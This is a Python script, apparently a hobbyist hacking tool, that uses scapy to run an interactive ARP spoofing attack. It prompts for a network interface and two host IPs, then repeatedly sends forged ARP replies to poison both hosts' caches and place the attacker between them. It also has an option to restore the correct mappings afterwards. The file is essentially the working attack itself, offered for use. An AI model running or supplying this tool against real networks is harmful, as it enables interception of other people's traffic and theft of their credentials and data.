from scapy.all import Ether, ARP, srp, sendp, conf
from banner_cli import rtxt, lbtxt, ctxt, ytxt
from keyboard import is_pressed
from time import sleep

def arp_sp():
    def getmac(ip): # get mac by ip with arp protocol
        try:
            packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
            result = srp(packet , timeout=3, verbose=0)
            return result[0][0][1].hwsrc
        except Exception:
            rtxt(text="[!] Error", end="\n")
    def spoof(target_ip , spoof_ip):
        try:
            target_mac = getmac(target_ip) # ARP -> IP 2 MAC
            # gtxt(f'Target mac :{target_mac}')
            packet = Ether(dst = target_mac) / ARP(psrc=spoof_ip , pdst=target_ip,hwdst = target_mac , op = "is-at")
            try:
                sendp(packet , verbose = 0)
                return True
            except :
                return False
        except Exception as er:
            print(er)
            rtxt("[!]    ERROR [WHILE SPOOFING]")

    def restore():
        try:
            ctxt("[~]   FIRST HOST IP : ", end='')
            target_ip = input()
            ctxt("[~]   SECOND HOST IP : ", end='')
            spoof_ip = input()
            def res(target_ip, spoof_ip):
                target_mac = getmac(target_ip)
                spoof_mac = getmac(spoof_ip)
                packet = Ether(dst = target_mac) / ARP(psrc = spoof_ip ,pdst = target_ip ,hwsrc = spoof_mac ,hwdst = target_mac ,op = "is-at")
                sendp(packet , verbose = 0)
            
            res(target_ip, spoof_ip)
            res(spoof_ip, target_ip)
            ctxt('[!]    RESTORED RO DEFAULT !')

        except Exception:
            rtxt("[!]    ERROR")

    def inj():
        ctxt("[~]   FIRST HOST IP : ", end='')
        target_ip = input()
        ctxt("[~]   SECOND HOST IP : ", end='')
        spoof_ip = input()
        try:
            spoof(target_ip , spoof_ip)
            spoof(spoof_ip , target_ip)
            lbtxt("[+]    SUCCESSFULY STARTED TO INJECT EACH 60 SECONDS ! \n       hold q for 6 seconds to break loop")
            while True:
                spoof(target_ip , spoof_ip)
                spoof(spoof_ip , target_ip)
                sleep(5)
                lbtxt(f'[+]    SPOOFED')
                if is_pressed('q'):
                    ctxt('[~]    SPOOFING STOPED !')
                    break
        except Exception:
            rtxt('[!]    ERROR OCCURRED !')


    # # # # # #  # # # # # # #  # # # # # #
    def arp_spoofing_runner():
        try:
            ytxt(text='[~]    ENTER YOUR INTERFACE : (default : Wi-Fi just press enter) ', end='')
            ifac = input("")
            if ifac != '':
                conf.iface = ifac
            else:
                conf.iface = "Wi-Fi" # select network interface card for attack
            ytxt(text='[~]    ENTER 0 FOR ATTACK AND 1 FOR RESTORE (for after attack) ', end='')
            cho = str(input())
            if cho == '0':
                inj()
            elif cho == '1':
                restore()
            else:
                rtxt('[!]    INCORRECT INPUT ')
        except Exception:
            rtxt("[!]    ERROR OCCURRED !")

    arp_spoofing_runner()            




if __name__ == '__main__' :
    arp_sp()